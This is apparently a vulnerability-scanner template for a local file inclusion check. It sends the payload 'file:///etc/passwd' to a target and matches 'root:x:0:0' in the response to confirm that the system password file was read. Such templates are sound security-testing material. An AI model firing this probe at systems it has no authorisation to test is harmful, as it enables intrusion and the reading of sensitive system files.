id: lfi6-1351
name: 'Traversal in file'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via file'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      file:
        - 'file:///etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
